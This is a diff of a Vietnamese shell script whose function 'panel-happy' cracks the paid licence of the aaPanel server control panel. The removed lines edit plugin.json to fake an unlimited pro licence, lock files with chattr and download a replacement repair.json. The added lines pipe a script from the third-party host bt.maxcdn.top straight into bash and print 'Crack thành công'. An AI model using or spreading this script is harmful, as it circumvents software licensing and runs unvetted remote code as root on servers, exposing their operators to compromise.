@@ -59,18 +59,12 @@ rm -f /www/server/panel/data/bind.pl
 red " Xóa liên kết đã thành công."
 }
 
-# 5 bẻ khóa trả tiền 
+# 5 bẻ khóa
 function panel-happy(){
-red " Vui lòng tự mở kho phần mềm một lần trước khi thực hiện"
-sed -i 's|"endtime": -1|"endtime": 999999999999|g' /www/server/panel/data/plugin.json
-sed -i 's|"pro": -1|"pro": 0|g' /www/server/panel/data/plugin.json
-chattr +i /www/server/panel/data/plugin.json
-chattr -i /www/server/panel/data/repair.json
-rm /www/server/panel/data/repair.json
-cd /www/server/panel/data
-wget https://raw.githubusercontent.com/DauDau432/Aapanel/main/repair.json
-chattr +i /www/server/panel/data/repair.json
-red " Crack thành công."
+    red " Đang thực hiện crack..."
+    curl https://bt.maxcdn.top/install/update_7.x_en.sh | bash
+    curl -v https://brandnew.aapanel.com
+    red " Crack thành công."
 }
 
 # 6 Xóa tệp nhật ký và khóa tệp để ngăn ghi
